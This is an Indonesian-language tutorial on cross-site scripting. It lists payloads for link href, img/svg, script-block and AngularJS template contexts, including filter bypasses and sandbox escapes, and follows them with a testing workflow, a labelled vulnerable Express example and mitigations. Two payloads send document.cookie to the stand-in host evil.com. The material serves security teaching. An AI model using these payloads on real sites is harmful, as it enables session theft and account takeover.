# Cross-Site Scripting (XSS): Vektor Tag Link, Gambar, Page Script, & Sandbox Bypass AngularJS

Dalam dunia keamanan aplikasi web, **Cross-Site Scripting (XSS)** secara konsisten menduduki peringkat teratas kerentanan paling sering ditemukan. Celah ini memungkinkan penyerang **mengeksekusi kode JavaScript berbahaya di dalam peramban korban** dalam konteks asal (*origin*) situs yang sah.

Namun, banyak pemula terjebak hanya menggunakan payload klasik `<script>alert(1)</script>` dan gagal ketika payload tersebut diblokir atau tidak cocok dengan konteks output. 

Kunci utama menguasai XSS adalah memahami bahwa **Konteks Output (HTML Body, Attribute `href`, Script Block, atau Template AngularJS) menentukan payload injeksi yang harus digunakan**.

## 2. Bedah Mendalam 4 Vektor Injeksi XSS

Berikut adalah 4 vektor injeksi utama beserta teknik bypass di berbagai lingkungan:

---

### Vektor 1: Tag Link (`<a href="...">` & Pseudo-Protocol Scheme)

Konteks ini terjadi ketika input pengguna dimasukkan ke dalam atribut `href` pada tag tautan `<a>`, tombol navigasi, atau sink DOM seperti `location.href`:

```html
<!-- Server merender input pengguna ke atribut href -->
<a href="USER_INPUT">Klik Di Sini untuk Melanjutkan</a>
```

#### Mengapa `<script>` Gagal?
Jika kamu memasukkan `<script>alert(1)</script>`, HTML akan ter-render sebagai:
`<a href="<script>alert(1)</script>">`
Peramban memperlakukannya sebagai string URL mentah dan **tidak akan mengeksekusi tag script** tersebut.

#### Solusi Penyerang (Pseudo-Protocol `javascript:` & Data URI):
Gunakan skema pseudo-protocol `javascript:` yang akan mengeksekusi JavaScript saat tautan diklik pengguna:

```http
javascript:alert(document.domain)
javascript:fetch('https://evil.com/steal?c='+document.cookie)
```

#### Variasi & Filter Bypass pada Atribut `href`:
1. **Data URI Scheme:**
   ```http
   data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
   ```
2. **Bypass Pemeriksaan URL Protokol (Jika server mewajibkan `http://` atau `https://`):**
   ```http
   javascript:alert(1)//https://trusted-site.com
   ```
   *(Penyerang menyisipkan `//https://...` sebagai komentar JavaScript di akhir payload agar validasi awalan/akhiran lolos).*

---

### Vektor 2: Tag Gambar (`<img src=x onerror=...>` & SVG Vectors)

Konteks ini terjadi ketika input pengguna di-render langsung ke dalam badan dokumen HTML (`<div>USER_INPUT</div>` atau `<p>USER_INPUT</p>`).

#### Mengapa Tag `<img>` Menjadi Favorit Utama Bug Hunter?
Tag `<img>` dan `<svg>` bersifat **0-Click Exploitation**—artinya JavaScript akan dieksekusi **secara instan dan otomatis** begitu halaman dimuat oleh peramban korban, tanpa membutuhkan interaksi klik dari korban!

#### Mekanisme Eksekusi `onerror`:
```html
<img src="x" onerror="alert(document.domain)" />
```
1. Browser mencoba memuat gambar dari URL `x`.
2. Karena sumber gambar tidak valid / gagal dimuat, event handler `onerror` langsung terpicu seketika dan mengeksekusi fungsi JavaScript di dalamnya!

#### Varian Populer & Obfuscation:
1. **Varian SVG Onload:**
   ```html
   <svg onload="alert(1)">
   <svg/onload=alert(1)>
   ```
2. **Varian Animasi SVG (`onbegin`):**
   ```html
   <svg><animate onbegin="alert(1)" attributeName="x" dur="1s">
   ```
3. **Payload Tanpa Spasi (Bypass Filter Spasi):**
   ```html
   <img/src=x/onerror=alert(1)>
   <img/src=1/onerror=this.src='https://evil.com/log?c='+document.cookie>
   ```

---

### Vektor 3: Page Script Breakout (Injeksi di Dalam Blok `<script>`)

Konteks ini terjadi ketika backend menaruh data pengguna ke dalam variabel JavaScript di dalam halaman web:

```html
<script>
  let searchQuery = 'USER_INPUT';
  displayResults(searchQuery);
</script>
```

Jika kamu memasukkan `<script>alert(1)</script>`, payload akan rusak karena berada di dalam string JavaScript (`let searchQuery = '<script>...'`).

#### Teknik 1: Tutup Tag Script (HTML Context Breakout)
Parser HTML peramban memprioritaskan tag penutup `</script>` di atas parser JavaScript. Kamu bisa langsung menutup blok script yang ada dan membuka blok baru:
```html
</script><script>alert(1)</script>
```

#### Teknik 2: Tutup String Literal (JavaScript Context Breakout)
Jika tag `</script>` diblokir atau di-filter, kamu cukup menutup tanda kutip string dan menyambungnya dengan kode berbahaya:
* **Payload Penutup Single Quote:**
  ```javascript
  '-alert(document.cookie)-'
  ';alert(1)//
  ```
  *Hasil di halaman:* `let searchQuery = ''-alert(document.cookie)-'';`
* **Payload ES6 Template Literals (Jika menggunakan backtick `` ` ``):**
  ```javascript
  ${alert(document.domain)}
  ```

---

### Vektor 4: AngularJS Client-Side Template Injection (CSTI & Sandbox Bypasses)

Pada aplikasi web yang menggunakan framework frontend **AngularJS (versi 1.x)**, terdapat mekanisme kompilasi template di sisi klien (*Client-Side Template Engine*).

Jika halaman web memiliki direktif atribut `ng-app` (misalnya `<body ng-app>` atau `<div ng-app>`):
```html
<body ng-app>
  <h1>Hasil Pencarian: USER_INPUT</h1>
</body>
```

#### Mengapa Filter Server Bisa Dikecoh?
Meskipun server backend melakukan sanitasi ketat dengan mengubah `<` menjadi `&lt;` dan `>` menjadi `&gt;` (sehingga tag `<script>` atau `<img>` tidak bisa jalan), **AngularJS di browser korban tetap akan membaca dan mengevaluasi ekspresi kurung kurawal ganda `{{...}}`!**

#### 1. Uji Awal Deteksi CSTI:
Kirim input: `{{7*7}}`
* Jika di layar muncul angka **`49`**, aplikasi terkonfirmasi rentan terhadap Client-Side Template Injection!

#### 2. Mengapa `{{alert(1)}}` Tidak Langsung Berjalan?
AngularJS memiliki mekanisme pengaman bernama **Expression Sandbox** yang membatasi akses ekspresi di dalam `{{ }}` agar tidak bisa langsung mengakses objek global `window` atau `document`.

#### 3. Teknik Sandbox Bypass (Function Constructor Escape):
Penyerang memanfaatkan properti bawaan JavaScript (`constructor.constructor`) untuk keluar dari sandbox AngularJS dan mengeksekusi `Function()` di level global:

* **Payload Universal AngularJS (Bypass via `Function` Constructor):**
  ```html
  {{constructor.constructor('alert(document.domain)')()}}
  ```
* **Payload Melalui Objek Scope (`$on` / `$eval`):**
  ```html
  {{$on.constructor('alert(1)')()}}
  {{$eval.constructor('alert(1)')()}}
  ```
* **Payload Array Prototype (AngularJS 1.6+):**
  ```html
  {{[].pop.constructor('alert(1)')()}}
  ```
* **Vektor Event Directive AngularJS:**
  ```html
  <input ng-focus="$event.view.alert(1)" autofocus>
  <div ng-init="a=constructor.constructor('alert(1)')()"></div>
  ```

## 3. Panduan Praktis Langkah Demi Langkah Pengujian XSS

Berikut alur kerja profesional saat menguji kerentanan XSS menggunakan **Burp Suite** dan Browser:

---

### Langkah 1: Kirim String Penanda Unik (Canary String)
Kirimkan kata acak unik yang mudah dicari untuk melihat di mana input kamu muncul pada kode sumber halaman:
```text
testxss123'"<>
```

---

### Langkah 2: Periksa Konteks Output di View Source / Inspect Element
Buka **Inspect Element** (atau cari respons di Burp Repeater) dan temukan di mana `testxss123` muncul:
1. **Di dalam HTML Body (`<p>testxss123</p>`):** Gunakan Vektor 2 (Tag `<img>` / `<svg>`).
2. **Di dalam Atribut Link (`<a href="testxss123">`):** Gunakan Vektor 1 (`javascript:alert(1)`).
3. **Di dalam Blok Script (`var q = 'testxss123';`):** Gunakan Vektor 3 (`';alert(1)//` atau `</script>`).
4. **Di dalam elemen yang memiliki `ng-app`:** Gunakan Vektor 4 (`{{constructor.constructor('alert(1)')()}}`).

---

### Langkah 3: Masukkan Payload yang Sesuai & Verifikasi Eksekusi
1. Masukkan payload yang dirancang khusus untuk konteks tersebut.
2. Kirim request dan amati peramban.
3. Begitu dialog pop-up `alert(document.domain)` muncul di layar, celah XSS terbukti valid (*PoC confirmed*)! 🎉

## 4. Bedah Kode Backend: Rentan vs Aman

### ❌ Contoh Kode Backend yang Rentan (Konkatenasi String & Sanitasi Parsial)
```typescript
import express from "express";
const app = express();

app.get("/search", (req, res) => {
  const query = req.query.q as string;

  // ❌ FATAL: Konkatenasi langsung tanpa context-aware escaping
  const html = `
    <body ng-app>
      <h2>Hasil pencarian untuk: ${query}</h2>
      <a href="${query}">Lihat tautan eksternal</a>
      <script>
        var lastSearch = '${query}';
      </script>
    </body>
  `;

  return res.send(html);
});
```

---

### ✅ Contoh Kode Backend & Frontend yang Aman (Context-Aware Escaping & CSP)
```typescript
import express from "express";
import DOMPurify from "dompurify";
import { JSDOM } from "jsdom";

const app = express();
const window = new JSDOM("").window;
const purify = DOMPurify(window);

app.get("/search", (req, res) => {
  const query = req.query.q as string;

  // 1. Terapkan Content Security Policy (CSP) ketat
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none';"
  );

  // 2. Sanitasi HTML menggunakan library standar industri
  const cleanQuery = purify.sanitize(query);

  // 3. Matikan evaluasi template pada konten dinamis jika memakai AngularJS
  // Gunakan direktif ng-non-bindable agar kurung kurawal {{ }} diabaikan
  const html = `
    <body ng-app>
      <h2 ng-non-bindable>${escapeHtml(cleanQuery)}</h2>
    </body>
  `;

  return res.send(html);
});

function escapeHtml(text: string): string {
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}
```

## 5. Ringkasan & Strategi Mitigasi Menyeluruh (Defense-in-Depth)

1. **Context-Aware Output Encoding:** Selalu lakukan encoding sesuai dengan konteks tempat data ditampilkan (HTML Body Encoding, Attribute Encoding, JavaScript Variable Encoding, URL Encoding).
2. **Implementasikan Content Security Policy (CSP):** Gunakan header `Content-Security-Policy: default-src 'self'; script-src 'self'` untuk melarang eksekusi inline script dan skema `javascript:`.
3. **Gunakan Direktif `ng-non-bindable` pada AngularJS:** Mencegah AngularJS mengevaluasi ekspresi template `{{ }}` pada konten yang berasal dari input pengguna.
4. **Gunakan Atribut Cookie `HttpOnly`:** Mencegah pencurian cookie session melalui JavaScript saat celah XSS terjadi.
